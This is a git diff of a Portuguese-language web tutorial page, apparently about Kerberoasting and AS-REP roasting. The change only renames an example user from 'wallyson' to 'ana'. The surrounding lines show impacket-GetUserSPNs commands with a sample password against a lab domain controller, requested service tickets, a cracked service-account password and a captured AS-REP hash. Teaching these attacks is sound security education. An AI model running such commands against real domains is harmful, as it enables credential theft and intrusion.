@@ -26,7 +26,7 @@ export default function Kerberoasting() {
       </p>
 
       <OutputBlock label="o ataque em uma figura" type="muted">
-{`     [Wallyson, user comum]                  [DC]                          [Atacante]
+{`     [Ana, user comum]                  [DC]                          [Atacante]
             │                                  │                                 │
             │  AS-REQ + AS-REP (TGT normal)    │                                 │
             │ ─────────────────────────────►  │                                 │
@@ -48,7 +48,7 @@ export default function Kerberoasting() {
         path="~"
         lines={[
           {
-            cmd: "impacket-GetUserSPNs acme.local/wallyson:'Senha@123' -dc-ip 10.10.10.5",
+            cmd: "impacket-GetUserSPNs acme.local/ana:'Senha@123' -dc-ip 10.10.10.5",
             out: `Impacket v0.12.0
 
 ServicePrincipalName               Name              MemberOf                                          PasswordLastSet
@@ -74,7 +74,7 @@ LDAP/dc01.acme.local               krbtgt                                       
         path="~"
         lines={[
           {
-            cmd: "impacket-GetUserSPNs acme.local/wallyson:'Senha@123' -dc-ip 10.10.10.5 -request -outputfile spns.txt",
+            cmd: "impacket-GetUserSPNs acme.local/ana:'Senha@123' -dc-ip 10.10.10.5 -request -outputfile spns.txt",
             out: `[*] Got TGS for HTTP/intranet.acme.local
 [*] Got TGS for MSSQLSvc/sql01.acme.local:1433
 [*] Got TGS for HOST/srv-iis01
@@ -144,7 +144,7 @@ Jenkins!2024     (svc_jenkins)`,
             comment: "lista de usuários (de OSINT, leak, enum4linux)",
             cmd: "cat users.txt",
             out: `admin
-wallyson
+ana
 maria
 jsmith
 svc_legacy
@@ -157,7 +157,7 @@ backup`,
             out: `Impacket v0.12.0
 
 [!] User admin doesn't have UF_DONT_REQUIRE_PREAUTH set
-[!] User wallyson doesn't have UF_DONT_REQUIRE_PREAUTH set
+[!] User ana doesn't have UF_DONT_REQUIRE_PREAUTH set
 [!] User maria doesn't have UF_DONT_REQUIRE_PREAUTH set
 [!] User jsmith doesn't have UF_DONT_REQUIRE_PREAUTH set
 $krb5asrep$23$svc_legacy@ACME.LOCAL:abc123def456789abc...$789xyz0123456789ab0123456789ab0123456789ab0123456789...    ← achou!
